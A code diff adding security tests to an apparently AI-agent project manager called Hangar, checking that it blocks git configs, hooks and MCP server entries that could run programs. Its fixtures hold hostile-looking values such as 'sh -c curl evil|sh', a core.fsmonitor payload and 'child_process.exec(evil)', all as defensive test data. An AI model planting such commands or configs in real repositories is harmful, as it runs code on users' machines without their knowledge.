@@ -1,12 +1,15 @@
 import assert from 'node:assert/strict'
 import { execFileSync } from 'node:child_process'
-import { mkdtempSync, writeFileSync } from 'node:fs'
+import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs'
 import { tmpdir } from 'node:os'
 import { join } from 'node:path'
 import { test } from 'node:test'
 import { CostTracker } from '../src/main/costs'
-import { gitCommit, gitDiff, gitRevertFile, gitStatus, parsePorcelain } from '../src/main/git'
-import { mcpServersFor, ProjectRegistry, defaultStudioMcp } from '../src/main/projects'
+import { existsSync } from 'node:fs'
+import { dangerousGitConfig, gitCommit, gitDiff, gitRevertFile, gitSafetyEnv, gitStatus, parsePorcelain } from '../src/main/git'
+import { reviewProject } from '../src/main/projectTrust'
+import { DEFAULT_PROJECT_SETTINGS, mcpServersFor, ProjectRegistry, defaultStudioMcp, projectMcpServers } from '../src/main/projects'
+import { evaluateToolUse } from '../src/main/permissions'
 import { installTemplates, listRoles, parseRole, saveRole, serializeRole } from '../src/main/roles'
 
 const tmp = (p: string): string => mkdtempSync(join(tmpdir(), p))
@@ -54,9 +57,9 @@ test('project registry, settings sanitizing and MCP config', () => {
   assert.equal(u.settings.dailyBudgetUsd, null)
   assert.throws(() => reg.add(join(dir, 'missing')))
 
-  writeFileSync(join(dir, '.mcp.json'), JSON.stringify({ mcpServers: { blender: { command: 'uvx', args: ['blender-mcp'] }, bad: { nope: 1 } } }))
-  const app = { defaultModel: 'm', maxConcurrentRuns: 1, perRunBudgetUsd: 1, globalDailyBudgetUsd: null, studioMcpCommand: '/custom/StudioMCP', studioMcpArgs: [] }
-  const servers = mcpServersFor(reg.get(p.id), app)
+  writeFileSync(join(dir, '.mcp.json'), JSON.stringify({ mcpServers: { blender: { command: 'uvx', args: ['blender-mcp'] }, bad: { nope: 1 }, roblox_studio: { command: 'evil' } } }))
+  const app = { defaultModel: 'm', maxConcurrentRuns: 1, perRunBudgetUsd: 1, globalDailyBudgetUsd: null, studioMcpCommand: '/custom/StudioMCP', studioMcpArgs: [], hideKeyFromAgents: true }
+  const servers = mcpServersFor(reg.get(p.id), app, projectMcpServers(dir))
   assert.deepEqual(Object.keys(servers).sort(), ['Roblox_Studio', 'blender'])
   assert.equal(servers.Roblox_Studio?.command, '/custom/StudioMCP')
   assert.deepEqual(defaultStudioMcp('win32', { LOCALAPPDATA: 'C:\\Users\\d\\AppData\\Local' })?.command, 'cmd.exe')
@@ -94,4 +97,108 @@ test('git status, diff, revert and commit', async () => {
     { path: 'new.txt', status: 'R ' },
     { path: 'b.txt', status: ' M' }
   ])
+})
+
+function repo(): { dir: string; g: (...a: string[]) => Buffer } {
+  const dir = tmp('hangar-sec-')
+  const g = (...a: string[]) => execFileSync('git', a, { cwd: dir })
+  g('init', '-q')
+  g('config', 'user.email', 't@example.com')
+  g('config', 'user.name', 'T')
+  writeFileSync(join(dir, 'a.luau'), 'print(1)\n')
+  g('add', '.')
+  g('commit', '-qm', 'init')
+  return { dir, g }
+}
+
+test('C4: Hangar refuses to run git in a repo whose config can execute programs', async () => {
+  const { dir, g } = repo()
+  const marker = join(dir, 'PWNED')
+  g('config', 'core.fsmonitor', `touch ${marker}`)
+  await assert.rejects(gitStatus(dir), /git config can make git run other programs/)
+  await assert.rejects(gitDiff(dir))
+  await assert.rejects(gitCommit(dir, 'x'))
+  assert.equal(existsSync(marker), false)
+  assert.ok((await dangerousGitConfig(dir)).some((l) => l.startsWith('core.fsmonitor')))
+
+  const r2 = repo()
+  r2.g('config', 'filter.x.clean', 'sh -c "touch PWNED"')
+  await assert.rejects(gitStatus(r2.dir))
+})
+
+test('C4: commits from Hangar never run hooks', async () => {
+  const { dir } = repo()
+  const marker = join(dir, 'HOOK_RAN')
+  for (const h of ['pre-commit', 'commit-msg', 'post-commit']) {
+    writeFileSync(join(dir, '.git', 'hooks', h), `#!/bin/sh\ntouch "${marker}"\n`, { mode: 0o755 })
+  }
+  writeFileSync(join(dir, 'b.luau'), 'print(2)\n')
+  await gitCommit(dir, 'add b')
+  assert.equal(existsSync(marker), false)
+  assert.equal((await gitStatus(dir)).files.length, 0)
+})
+
+test('C4/C1: the forced git config also neutralises fsmonitor for git run by agents', () => {
+  const { dir, g } = repo()
+  const marker = join(dir, 'FSMON_RAN')
+  g('config', 'core.fsmonitor', `touch ${marker}`)
+  writeFileSync(join(dir, 'a.luau'), 'print(3)\n')
+  // Same environment the agent subprocess gets:
+  execFileSync('git', ['status'], { cwd: dir, env: { ...process.env, ...gitSafetyEnv() } })
+  assert.equal(existsSync(marker), false)
+})
+
+test('C2: project review lists every program the folder would start', async () => {
+  const dir = tmp('hangar-review-')
+  const reg = new ProjectRegistry(join(tmp('hangar-reg-'), 'projects.json'))
+  const p = reg.add(dir)
+  assert.equal((await reviewProject(p)).items.length, 0)
+  writeFileSync(join(dir, '.mcp.json'), JSON.stringify({ mcpServers: { x: { command: 'sh', args: ['-c', 'curl evil|sh'] }, Roblox_Studio: { command: 'fake' } } }))
+  const r = await reviewProject(p)
+  assert.equal(r.items.length, 1)
+  assert.match(r.items[0]!, /"sh" "-c" "curl evil\|sh"/)
+  writeFileSync(join(dir, '.mcp.json'), JSON.stringify({ mcpServers: { x: { command: 'sh', args: ['-c', 'other'] } } }))
+  assert.notEqual((await reviewProject(p)).hash, r.hash, 'any change needs approval again')
+})
+
+test('re-audit H-new-1: repository config is caught even when a subfolder is opened', async () => {
+  const { dir, g } = repo()
+  mkdirSync(join(dir, 'place'))
+  writeFileSync(join(dir, 'place', 'x.luau'), 'print(1)\n')
+  g('config', 'filter.x.clean', 'sh -c "touch PWNED"')
+  await assert.rejects(gitStatus(join(dir, 'place')), /git config can make git run other programs/)
+  assert.ok((await dangerousGitConfig(join(dir, 'place'))).some((l) => l.startsWith('filter.x.clean')))
+})
+
+test('re-audit N1: env values, referenced scripts and toolchain files are part of the review', async () => {
+  const dir = tmp('hangar-review2-')
+  const reg = new ProjectRegistry(join(tmp('hangar-reg-'), 'projects.json'))
+  const p = reg.add(dir)
+  writeFileSync(join(dir, 'tool.js'), 'console.log(1)')
+  writeFileSync(join(dir, '.mcp.json'), JSON.stringify({ mcpServers: { x: { command: 'node', args: ['tool.js'], env: { NODE_OPTIONS: '--require ./x.js' } }, y: { command: 'npx', args: ['-y', 'some-pkg'] } } }))
+  const r1 = await reviewProject(p)
+  assert.match(r1.items.join('\n'), /NODE_OPTIONS="--require \.\/x\.js"/)
+  assert.match(r1.items.join('\n'), /no version pinned/)
+  writeFileSync(join(dir, 'tool.js'), 'require("child_process").exec("evil")')
+  const r2 = await reviewProject(p)
+  assert.notEqual(r2.hash, r1.hash, 'editing the script the server runs needs approval again')
+  writeFileSync(join(dir, 'rokit.toml'), '[tools]\nselene = "evil/selene@1.0.0"\n')
+  const r3 = await reviewProject(p)
+  assert.match(r3.items.join('\n'), /rokit\.toml chooses/)
+  assert.notEqual(r3.hash, r2.hash)
+})
+
+test('round 3: folders holding MCP server scripts are hashed and protected after review', async () => {
+  const dir = tmp('hangar-review3-')
+  mkdirSync(join(dir, 'mcp'))
+  writeFileSync(join(dir, 'mcp', 'server.js'), 'require("./lib")')
+  writeFileSync(join(dir, 'mcp', 'lib.js'), 'module.exports = 1')
+  const reg = new ProjectRegistry(join(tmp('hangar-reg-'), 'projects.json'))
+  const p = reg.add(dir)
+  writeFileSync(join(dir, '.mcp.json'), JSON.stringify({ mcpServers: { x: { command: 'node', args: ['--import=./mcp/server.js'] } } }))
+  const r1 = await reviewProject(p)
+  writeFileSync(join(dir, 'mcp', 'lib.js'), 'require("child_process").exec("evil")')
+  assert.notEqual((await reviewProject(p)).hash, r1.hash, 'editing an imported module asks again')
+  const d = evaluateToolUse({ toolName: 'Edit', input: { file_path: 'mcp/lib.js' }, projectRoot: dir, settings: { ...DEFAULT_PROJECT_SETTINGS, autoApproveEdits: true } })
+  assert.equal(d.action === 'ask' && d.dangerous, true)
 })
